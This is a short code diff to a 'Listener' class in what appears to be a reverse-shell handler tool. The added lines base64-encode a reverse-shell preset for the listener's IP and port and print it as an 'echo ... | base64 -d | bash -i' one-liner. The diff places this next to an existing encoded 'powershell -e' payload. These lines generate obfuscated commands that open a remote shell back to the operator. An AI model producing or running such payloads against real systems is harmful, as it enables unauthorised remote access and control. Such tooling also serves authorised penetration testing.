@@ -1688,6 +1688,9 @@ class Listener:
 			output.extend(('', '➤  ' + str(paint(ip).CYAN) + ":" + str(paint(self.port).red), ''))
 			output.append(presets[0].format(ip, self.port))
 			output.append("")
+			rev_shell_b64 = base64.b64encode(presets[0].format(ip, self.port).encode()).decode()
+			output.append(f'echo {rev_shell_b64} | base64 -d | bash -i')
+			output.append("")
 			output.append("cmd /c powershell -e " + base64.b64encode(presets[1].format(ip, self.port).encode("utf-16le")).decode())
 
 			output.extend(textwrap.dedent(f"""
